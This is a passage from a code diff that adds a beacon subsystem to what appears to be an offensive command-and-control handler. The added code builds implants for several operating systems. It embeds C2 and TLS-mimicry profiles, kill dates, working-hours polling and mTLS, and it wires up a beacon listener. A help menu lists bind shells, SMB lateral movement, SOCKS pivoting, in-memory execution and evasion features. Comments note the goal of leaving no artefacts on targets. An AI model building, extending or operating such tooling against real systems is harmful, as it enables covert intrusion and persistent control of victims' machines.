+                # match but the CA inside one was regenerated (which
+                # is not fine and the directory check would miss).
+                build_ca = params.get('mtls_ca') or os.path.join(
+                    build_dir_norm, 'ca.pem'
+                ) if params.get('mtls_dir') else self.mtls_ca_cert
+                handler_ca = (
+                    os.path.join(handler_dir_norm, 'ca.pem')
+                    if handler_dir_norm else self.beacon_mtls_ca
+                )
+                try:
+                    if (build_ca and handler_ca
+                            and os.path.isfile(build_ca)
+                            and os.path.isfile(handler_ca)):
+                        import hashlib as _hl
+                        with open(build_ca, 'rb') as fh:
+                            build_fp = _hl.sha256(fh.read()).hexdigest()
+                        with open(handler_ca, 'rb') as fh:
+                            handler_fp = _hl.sha256(fh.read()).hexdigest()
+                        if build_fp != handler_fp:
+                            warn_lines.append(
+                                f"CA mismatch: the CA in this build "
+                                f"({build_ca}, sha256 "
+                                f"{build_fp[:16]}…) does not match the "
+                                f"CA the beacon listener verifies "
+                                f"against ({handler_ca}, sha256 "
+                                f"{handler_fp[:16]}…). The handshake "
+                                f"will fail regardless of directory "
+                                f"names."
+                            )
+                except Exception:
+                    pass
+
+            if warn_lines:
+                print(f"\n{c['yellow']}{c['bold']}"
+                      f"[BEACON-BUILD] mTLS compatibility warning:"
+                      f"{c['end']}")
+                for line in warn_lines:
+                    print(f"  {c['yellow']}⚠  {line}{c['end']}")
+                print()
+                try:
+                    proceed = input(
+                        f"  {c['yellow']}Continue build anyway? "
+                        f"[y/N]{c['end']}: "
+                    ).strip().lower()
+                except (EOFError, KeyboardInterrupt):
+                    print()
+                    if pubkey_tmp:
+                        try:
+                            os.remove(pubkey_tmp)
+                        except OSError:
+                            pass
+                    return
+                if proceed not in ('y', 'yes'):
+                    print(f"{c['cyan']}[BEACON-BUILD] Cancelled"
+                          f"{c['end']}")
+                    if pubkey_tmp:
+                        try:
+                            os.remove(pubkey_tmp)
+                        except OSError:
+                            pass
+                    return
+
+        # ---- Compile -------------------------------------------------
+        print(f"\n{c['cyan']}[BEACON-BUILD] target={cfg.target_os}/"
+              f"{cfg.target_arch}  format={cfg.output_format}  "
+              f"profile={profile_name}  kill_days={cfg.kill_days}"
+              f"{c['end']}")
+        print(f"{c['cyan']}[BEACON-BUILD] url={cfg.url}{c['end']}")
+        print(f"{c['cyan']}[BEACON-BUILD] tls_profile={cfg.tls_profile}"
+              f"{c['end']}")
+        if cfg.work_hours_start == cfg.work_hours_end:
+            print(f"{c['cyan']}[BEACON-BUILD] work_hours=off (24/7)"
+                  f"{c['end']}")
+        else:
+            print(f"{c['cyan']}[BEACON-BUILD] "
+                  f"work_hours={cfg.work_hours_start}-{cfg.work_hours_end}"
+                  f" (target local time){c['end']}")
+        if cfg.verbose:
+            print(f"{c['yellow']}[BEACON-BUILD] verbose=on — debug build, "
+                  f"leaves stderr traces on the target{c['end']}")
+        else:
+            print(f"{c['cyan']}[BEACON-BUILD] verbose=off{c['end']}")
+
+        try:
+            builder = BeaconBuilder(source_dir, output_dir)
+        except RuntimeError as exc:
+            print(f"{c['red']}[BEACON-BUILD] {exc}{c['end']}")
+            if pubkey_tmp:
+                try:
+                    os.remove(pubkey_tmp)
+                except OSError:
+                    pass
+            return
+
+        try:
+            out_path = builder.build(cfg, profile=beacon_profile)
+        except subprocess.CalledProcessError as exc:
+            print(f"{c['red']}[BEACON-BUILD] compile failed "
+                  f"(exit {exc.returncode}){c['end']}")
+            if pubkey_tmp:
+                try:
+                    os.remove(pubkey_tmp)
+                except OSError:
+                    pass
+            return
+        except RuntimeError as exc:
+            print(f"{c['red']}[BEACON-BUILD] {exc}{c['end']}")
+            if pubkey_tmp:
+                try:
+                    os.remove(pubkey_tmp)
+                except OSError:
+                    pass
+            return
+        finally:
+            # The scratch pubkey served its purpose once the linker
+            # flag was assembled. Never leave it in beacon_output/ —
+            # operators frequently run the agent from that directory,
+            # and the file would show up in an `ls` on the target.
+            if pubkey_tmp:
+                try:
+                    os.remove(pubkey_tmp)
+                except OSError:
+                    pass
+
+        if not out_path or not os.path.exists(out_path):
+            print(f"{c['red']}[BEACON-BUILD] build reported success but "
+                  f"no output file at {out_path}{c['end']}")
+            return
+
+        size = os.path.getsize(out_path)
+        print(f"{c['green']}[BEACON-BUILD] Built {out_path} "
+              f"({self._format_size(size)}){c['end']}")
 
     def _make_session_id(self, client_id, addr, shell_type, sysinfo=None):
         ip = addr[0]
@@ -709,6 +1695,27 @@ class TORNADOREVC2:
         words = readline.get_line_buffer().split()
         cmd = words[0].lower() if words else ''
         mode = getattr(self, '_completer_mode', 'main')
+
+        if mode == 'beacon':
+            if arg_i == 0:
+                return sorted(
+                    c for c in BEACON_COMMANDS
+                    if c.startswith(text.lower())
+                )
+            # File arguments: complete local paths for upload and for
+            # every command that reads a local file as its first arg.
+            if cmd == 'upload' and arg_i == 1:
+                return self._complete_paths(text)
+            if cmd == 'download' and arg_i == 2:
+                return self._complete_paths(text)
+            if cmd in ('pyexec', 'psexec', 'shexec') and arg_i == 1:
+                return self._complete_paths(text)
+            if cmd == 'execmem' and arg_i == 1:
+                return self._complete_paths(text)
+            if cmd == 'bof' and arg_i == 1:
+                return self._complete_paths(text)
+            return []
+
         session_sock = self.current_client if mode == 'client' else None
         if mode == 'client':
             if arg_i == 0:
@@ -3624,6 +4631,15 @@ public static class SmbForwarder {{
                     self.print_payloads()
                 elif cmd_lower in ('status', 'ls'):
                     self.print_status()
+                    # Show beacons alongside shell sessions so `ls` is
+                    # a single-view inventory of everything connected.
+                    # Beacon listing is skipped silently when the
+                    # subsystem isn't enabled.
+                    if self.beacon is not None:
+                        try:
+                            self.beacon_console.print_list()
+                        except Exception:
+                            pass
                 elif cmd_lower == 'sessions':
                     self.registry.list_sessions(self.colors)
                 elif cmd_lower == 'reconnects':
@@ -3877,69 +4893,147 @@ public static class SmbForwarder {{
                         self.verify_file(client_sock, cmd_parts[2])
                     except ValueError:
                         print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
+                elif cmd_lower in ('beacons', 'bl'):
+                    if self.beacon is None:
+                        print(f"{self.colors['yellow']}Beacon subsystem not "
+                              f"enabled — start with --beacon-port"
+                              f"{self.colors['end']}")
+                        continue
+                    self.beacon_console.print_list()
+                elif cmd_lower in ('beacon-build', 'bbuild'):
+                    self.beacon_build(cmd_parts)
+                elif cmd_lower in ('beacon-rm', 'beacon-forget'):
+                    if self.beacon is None:
+                        print(f"{self.colors['yellow']}Beacon subsystem "
+                              f"not enabled{self.colors['end']}")
+                        continue
+                    if len(cmd_parts) < 2:
+                        print(f"{self.colors['red']}Usage: beacon-rm <ID>"
+                              f"{self.colors['end']}")
+                        continue
+                    try:
+                        rm_id = int(cmd_parts[1])
+                    except ValueError:
+                        print(f"{self.colors['red']}Invalid ID"
+                              f"{self.colors['end']}")
+                        continue
+                    sess = self.beacon.get(rm_id)
+                    if sess is None:
+                        print(f"{self.colors['red']}Beacon #{rm_id} not "
+                              f"found{self.colors['end']}")
+                        continue
+                    try:
+                        self.beacon.forget(rm_id)
+                        print(f"{self.colors['green']}Beacon #{rm_id} "
+                              f"forgotten{self.colors['end']}")
+                    except Exception as exc:
+                        print(f"{self.colors['red']}Could not forget: "
+                              f"{exc}{self.colors['end']}")
+                elif cmd_lower == 'beacon':
+                    if self.beacon is None:
+                        print(f"{self.colors['yellow']}Beacon subsystem not "
+                              f"enabled — start with --beacon-port"
+                              f"{self.colors['end']}")
+                        continue
+                    if len(cmd_parts) < 2:
+                        print(f"{self.colors['red']}Usage: beacon <ID>"
+                              f"{self.colors['end']}")
+                        continue
+                    try:
+                        sid = int(cmd_parts[1])
+                    except ValueError:
+                        print(f"{self.colors['red']}Invalid ID"
+                              f"{self.colors['end']}")
+                        continue
+                    self.beacon_console.attach(sid)
                 elif cmd_lower == 'help':
                     print(f"""
     {self.colors['green']}SESSION MANAGEMENT:{self.colors['end']}
+    status / ls             List active sessions
+    sessions                Show tracked sessions (incl. disconnected)
+    reconnects              Session reconnect history
+    switch <ID>             Attach to a client session
+    kill <ID>               Terminate a session
+    rename / rn <ID> <name> Assign a friendly name
+    sysinfo <ID> [--stealth|--full]  Refresh host information
     bind <host> <port> [--tls] [--verify]
                             Dial a target listening for a bind shell
-    switch <ID>             Client interaction
-    kill <ID>               Terminate client
-    status/ls               Show active clients
-    sessions                Show tracked sessions (active + disconnected)
-    reconnects              Show session reconnect history
-    sysinfo <ID> [--stealth|--full]   Refresh and show host information (default: stealth)
-    rename/rn <ID> <name>   Rename session
-    payloads                Show payloads list
-    clear/cls               Clear screen
-    update                  Pull latest from the official repository branch and restart
-    help                    This help menu
-    exit/quit               Shutdown server
-
-    {self.colors['green']}REPORTING:{self.colors['end']}
-    export <ID>                                              Export HTML session transcript
+    export <ID>             Export HTML session transcript
+    payloads                Show built-in payload catalog
+    update                  Pull latest from GitHub and restart
+    clear / cls             Clear the screen
+    help                    This menu
+    exit / quit             Shutdown handler
 
     {self.colors['green']}PLUGINS:{self.colors['end']}
-    plugins / plugins list                                   List registered plugins
-    plugins load|unload|reload|rescan|info <name>            Manage plugins at runtime
-    run <plugin> <ID>                                        Execute a plugin on a session
-    bof <ID> <name> [args...]     Run a registered BOF from a session
+    plugins / plugins list                              List registered plugins
+    plugins list --verbose                              Show module paths and state
+    plugins load|unload|reload|rescan|info <name>       Manage plugins at runtime
+    run <plugin> <ID> [args...]                         Execute a plugin on a session
+    bof <ID> <name> [args...]                           Run a registered BOF (Windows)
 
     {self.colors['green']}TRANSPORT SWITCHING:{self.colors['end']}
-    http2switch <ID> [--rh <ip|iface>] [--profile <name>]    Switch session to the HTTP/2 channel
-                                                              (interactive profile picker when --profile omitted)
+    http2switch <ID> [--rh <ip|iface>] [--profile <name>]
+                            Switch session to the HTTPS secondary channel
+                            (interactive profile picker when --profile omitted)
     smbswitch <ID> [--pipe <name>] [--user <u>] [--pass <p>] [--domain <d>]
-                                                              Switch session to SMB named-pipe channel
+                            Switch session to the SMB named-pipe channel (Windows)
     smblateral <A_ID> <B_host> <B_pipe> [--user <u>] [--pass <p>] [--domain <d>]
-                                                              Open a lateral channel from session A to host B
-    backtoshell <ID>                                         Close secondary transport and go back to shell
-    transport <ID>                                           Show which channel is active
-    profiles                                                 List available malleable profiles
+                            Open a lateral channel from session A to host B
+    backtoshell <ID>        Close secondary transport, revert to shell
+    transport <ID>          Show the state of every channel
+    profiles                List available malleable profiles
 
-    {self.colors['green']}OPSEC (always on):{self.colors['end']}
-    Command obfuscation         Per-session XOR+base64 (bash / PowerShell)
-    In-process execution        cat/ls/env/ps served by HTTP/2 agent on Linux
-    ECDSA signing               Signed commands on Windows HTTP/2 sessions
-    Kill date                   Agents self-destruct after TORNADO_KILL_DAYS
+    {self.colors['green']}BEACONS:{self.colors['end']}
+    beacons / bl            List active beacons
+    beacon <ID>             Attach to a beacon console
+    beacon-build            Interactive build wizard
+    beacon-build <os> <arch> [flags]
+                            Non-interactive compile
+      flags:
+        --format <exe|dll|elf|shellcode>
+        --url <https://host:port>
+        --profile <default|stealth|opsec|paranoid>
+        --c2-profile <name>            e.g. chrome, slack
+        --tls-profile <go|chrome|firefox|safari>
+        --kill-days <N>                (0 = no deadline)
+        --work-hours HH:MM-HH:MM       target local time; wrapped OK
+        --work-off                     24/7 polling
+        --mtls                         embed handler's mtls_certs/
+        --mtls-dir <dir>               embed from a specific PKI directory
+        --mtls-cert / --mtls-key / --mtls-ca
+                                       override individual PEM paths
+        --verbose                      diagnostic stderr on target
+                                       (debug builds only — leaves
+                                       forensic artefacts)
+      output: beacon_output/beacon_<os>_<arch>[.exe]
+    beacon-rm <ID>          Forget a beacon session from the registry
 
-    {self.colors['green']}INTERNAL PIVOTING (SOCKS5):{self.colors['end']}
-    socks <ID> <listen_port>                                 Start SOCKS5 proxy via session
-    socks <ID> test <host> <port>                            Test internal TCP reachability
-    socks <ID> reset [--hard]                                Reset tunnel (soft: purge streams; hard: redeploy agent)
-    tunnels                                                  List active SOCKS proxies
-    socks stop <proxy_id>                                    Stop proxy + delete remote agent artifact
+    {self.colors['green']}SOCKS5 PIVOTING:{self.colors['end']}
+    socks <ID> <listen_port>            Start a SOCKS5 proxy through a session
+    socks <ID> test <host> <port>       Test TCP reachability through the proxy
+    socks <ID> reset [--hard]           Reset tunnel state (soft or hard)
+    tunnels                             List active SOCKS proxies
+    socks stop <proxy_id>               Stop a proxy and clean up its remote agent
 
     {self.colors['green']}IN-MEMORY EXECUTION:{self.colors['end']}
-    run inmemory <ID> <filetype> <local_file> [-- args] [--save-output <file>]
-      filetype: py, ps, exe, elf, bat, sh
+    run inmemory <ID> <type> <local_file> [-- args] [--save-output <file>]
+      type: py, ps, exe, elf, bat, sh
 
     {self.colors['green']}FILE TRANSFER:{self.colors['end']}
-    upload [--resume] <ID> <local> <remote>                     Chunked upload with SHA256 verify
-    upload --https [iface] [-RH host[:port]] <ID> <local> <remote>  HTTPS upload
-    download [--resume] <ID> <remote> <local>                   Chunked download with SHA256 verify
-    download --https-push [iface] [-RH host[:port]] <ID> <remote> <local>  HTTPS push download
-    verify/hash <ID> <remote>                                   Remote file size and SHA256
+    upload   [--resume] <ID> <local> <remote>                     Chunked upload, SHA-256 verified
+    upload   --https [iface] [-RH host[:port]] <ID> <local> <remote>
+                                                                  HTTPS upload
+    download [--resume] <ID> <remote> <local>                     Chunked download, SHA-256 verified
+    download --https-push [iface] [-RH host[:port]] <ID> <remote> <local>
+                                                                  HTTPS push download (target PUTs)
+    verify / hash <ID> <remote>                                   Remote file size and SHA-256
 
-    {self.colors['yellow']}Inside a client shell, omit <ID> for session-targeted commands{self.colors['end']}""")
+    {self.colors['yellow']}Inside a client shell, omit <ID> for session-targeted commands{self.colors['end']}
+
+    {self.colors['green']}Always-on OPSEC:{self.colors['end']}
+    Command obfuscation  ·  In-process native verbs (Linux HTTP/2)
+    ECDSA-signed commands (Windows HTTP/2)  ·  Per-agent kill date""")
             except KeyboardInterrupt:
                 print(f"\n{self.colors['yellow']}For exiting please type exit(e) or quit(q){self.colors['end']}")
 
@@ -4070,6 +5164,11 @@ public static class SmbForwarder {{
         if self._h2_listener is not None:
             try:
                 self._h2_listener.stop()
+            except Exception:
+                pass
+        if self._beacon_listener is not None:
+            try:
+                self._beacon_listener.stop()
             except Exception:
                 pass
         self.tunnels.shutdown_for_restart()
@@ -4452,6 +5551,112 @@ public static class SmbForwarder {{
                     f"(pip install h2){self.colors['end']}"
                 )
 
+        # ---- Beacon subsystem (opt-in) -----------------------------------
+        #
+        # Runs on its own port with its own listener and its own session
+        # registry. The shell handler only ever holds three references
+        # (`self.beacon`, `self.beacon_console`, `self._beacon_listener`)
+        # and never reads or writes beacon session state directly.
+        if self.beacon_port:
+            try:
+                from .beacon import (
+                    BeaconEngine, BeaconListener, BeaconConsole,
+                )
+                self.beacon = BeaconEngine(self)
+                self.beacon_console = BeaconConsole(self.beacon, self)
+
+                # When mTLS is enabled for beacons, use the mTLS server
+                # certificate. Beacons embed a RootCA at build time
+                # (whatever the operator passed to --mtls / --mtls-dir);
+                # the server cert must chain to that same CA or the
+                # agent's chain verification fails.
+                #
+                # Priority order:
+                #   1. --beacon-mtls-dir  (directory convenience)
+                #   2. --beacon-mtls-server-cert / --beacon-mtls-server-key
+                #   3. handler's own mtls_certs/ bundle
+                # Only reached when --beacon-mtls-ca (or --beacon-mtls-dir)
+                # was passed — otherwise the listener is server-TLS only
+                # and uses the plain TLS cert.
+                beacon_ca = getattr(self, 'beacon_mtls_ca', None)
+                beacon_dir = getattr(self, 'beacon_mtls_dir', None)
+                beacon_sc = getattr(self, 'beacon_mtls_server_cert', None)
+                beacon_sk = getattr(self, 'beacon_mtls_server_key', None)
+
+                if beacon_dir:
+                    beacon_dir = os.path.expanduser(beacon_dir)
+                    beacon_ca = os.path.join(beacon_dir, 'ca.pem')
+                    server_cert = os.path.join(beacon_dir, 'server-mtls.pem')
+                    server_key  = os.path.join(beacon_dir, 'server-mtls.key')
+                elif beacon_ca:
+                    server_cert = beacon_sc or self.mtls_server_cert
+                    server_key  = beacon_sk or self.mtls_server_key
+                else:
+                    server_cert = self.certfile
+                    server_key  = self.keyfile
+
+                # Fail early with an actionable message rather than
+                # letting the handshake fail opaquely at check-in time.
+                if beacon_ca:
+                    missing = [
+                        p for p in (beacon_ca, server_cert, server_key)
+                        if not os.path.isfile(p)
+                    ]
+                    if missing:
+                        print(
+                            f"{self.colors['red']}[BEACON] mTLS material "
+                            f"missing:{self.colors['end']}"
+                        )
+                        for p in missing:
+                            print(
+                                f"{self.colors['red']}  {p}"
+                                f"{self.colors['end']}"
+                            )
+                        raise FileNotFoundError(
+                            "beacon mTLS material incomplete"
+                        )
+
+                # The listener auto-discovers every path declared in
+                # profiles/c2/*.json and registers them all. An agent
+                # built with any C2 profile (`--c2-profile chrome`,
+                # `--c2-profile slack`, ...) reaches the listener
+                # without a matching flag at handler start.
+                #
+                # When --beacon-profile is passed, the listener narrows
+                # to that profile's paths only.
+                # Pass the *resolved* CA. When --beacon-mtls-dir was
+                # supplied, beacon_ca holds the path to that directory's
+                # ca.pem; self.beacon_mtls_ca is still None because the
+                # --beacon-mtls-ca flag was not passed. Reading the
+                # attribute here would silently downgrade the listener
+                # to server-TLS-only and skip client-certificate
+                # verification entirely.
+                self._beacon_listener = BeaconListener(
+                    self.beacon, self.host, self.beacon_port,
+                    server_cert, server_key,
+                    client_ca=beacon_ca,
+                    profile_filter=getattr(self, 'beacon_c2_profile', None),
+                )
+                if self._beacon_listener.start():
+                    print(
+                        f"{self.colors['green']}[BEACON] listener on "
+                        f"{self.host}:{self.beacon_port}"
+                        f"{self.colors['end']}"
+                    )
+                else:
+                    self._beacon_listener = None
+                    print(
+                        f"{self.colors['yellow']}[BEACON] listener did not "
+                        f"start (pip install flask){self.colors['end']}"
+                    )
+            except ImportError as exc:
+                self.beacon = None
+                self.beacon_console = None
+                print(
+                    f"{self.colors['yellow']}[BEACON] subsystem disabled: "
+                    f"{exc}{self.colors['end']}"
+                )
+
         self.running = True
 
         threading.Thread(target=self.listener, args=(tcp_server, False), daemon=True).start()
@@ -4502,6 +5707,36 @@ def main():
                         help='Directory of *.json profile files. Scanned by '
                              '`http2switch` and the `profiles` command. '
                              'Default: <package>/profiles/')
+    parser.add_argument('--beacon-port', type=int, default=None,
+                        help='Enable the beacon subsystem on this port. '
+                             'Runs alongside the shell listeners; omit to '
+                             'keep the handler shell-only.')
+    parser.add_argument('--beacon-mtls-ca', default=None,
+                        help='CA file used to verify beacon client '
+                             'certificates. When set, the beacon listener '
+                             'requires mTLS.')
+    parser.add_argument('--beacon-mtls-server-cert', default=None,
+                        help='Server certificate served by the beacon '
+                             'listener. Must chain to the CA the beacon '
+                             'agent embedded at build time. Defaults to '
+                             'mtls_certs/server-mtls.pem when '
+                             '--beacon-mtls-ca is set.')
+    parser.add_argument('--beacon-mtls-server-key', default=None,
+                        help='Private key for --beacon-mtls-server-cert. '
+                             'Defaults to mtls_certs/server-mtls.key.')
+    parser.add_argument('--beacon-mtls-dir', default=None,
+                        help='Convenience: point the beacon listener at a '
+                             'directory containing ca.pem, server-mtls.pem, '
+                             'and server-mtls.key. Implies --beacon-mtls-ca. '
+                             'Overrides --beacon-mtls-ca, '
+                             '--beacon-mtls-server-cert, and '
+                             '--beacon-mtls-server-key.')
+    parser.add_argument('--beacon-profile', default=None,
+                        help='Name of a C2 profile under profiles/c2/. '
+                             'The listener registers the profile\'s '
+                             'paths alongside the defaults, so beacons '
+                             'built with --c2-profile <name> can check '
+                             'in against the same listener.')
     parser.add_argument('-c', '--cert', default=os.path.join('tls_certs', 'server.pem'), help='TLS certificate file')
     parser.add_argument('-k', '--key', default=os.path.join('tls_certs', 'server.key'), help='TLS private key file')
     parser.add_argument('--mtls-ca-cert', default=os.path.join('mtls_certs', 'ca.pem'))
@@ -4533,6 +5768,18 @@ def main():
     srv._front_port   = args.front_port
     srv.profile_dir   = args.profile_dir
     srv.profile       = _load_malleable_profile(args.profile)
+    srv.beacon_port   = args.beacon_port
+    srv.beacon_mtls_ca = args.beacon_mtls_ca
+    srv.beacon_mtls_server_cert = args.beacon_mtls_server_cert
+    srv.beacon_mtls_server_key  = args.beacon_mtls_server_key
+    srv.beacon_mtls_dir         = args.beacon_mtls_dir
+    # --beacon-mtls-dir is a shortcut; it implies --beacon-mtls-ca by
+    # resolving the CA path below, but the actual resolution happens
+    # in start() so the directory can be validated there.
+    # Optional C2 profile name. When set, the beacon listener narrows
+    # to that profile's paths. When None (the default), the listener
+    # scans profiles/c2/ and registers every profile's paths.
+    srv.beacon_c2_profile = args.beacon_profile
 
     srv.start()
 
